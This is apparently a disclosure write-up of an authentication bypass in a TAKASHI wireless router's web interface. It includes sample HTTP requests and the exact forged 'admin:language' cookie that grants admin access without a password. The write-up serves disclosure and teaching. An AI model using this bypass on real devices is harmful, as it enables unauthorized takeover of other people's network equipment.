#TAKASHI Wireless Instant Router And Repeater Web Application Authentication Bypass
Software version 	    V5.07.38_AAL03
Hardware version 	    V3.0 

This vulnerability is related to how the web application handles sessions for authenticated users. The issue arises due to improper session management, allowing unauthorized users to gain admin-level access.

#Below You Will See A Request Comparison

To understand how this vulnerability works, let's compare an unauthenticated request to an authenticated request.

**An unauthenticated request looks like this:**

POST /LoginCheck HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: `http://192.168.2.1/login.asp`
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: `http://192.168.2.1`
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: language=en
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Username=admin&checkEn=0&Password=whatsthepassword

**When the user is authenticated, the request looks like this:**

GET /wireless_basic.asp HTTP/1.1
Host: `192.168.2.1`
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: `http://192.168.2.1/advance.asp`
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: language=en; admin:language=en
Upgrade-Insecure-Requests: 1
Priority: u=4


Key Difference

The key difference between the two requests is the presence of the following cookie:

admin:language=en

The Vulnerability

This vulnerability is based on the way the application validates session data. By manipulating the admin:language cookie, an unauthenticated user can gain access to authenticated pages.
Exploit Mechanics

To exploit this vulnerability, all an attacker needs to do is set the cookie admin:language with any arbitrary value. The application will trust this cookie and treat the user as an authenticated admin.

admin:language=<any_value>

Where <any_value> can be any string,text or numbers. As long as the cookie is given that name, the application will behave as if the user is authenticated.
Conclusion

This vulnerability shows the importance of proper session management.
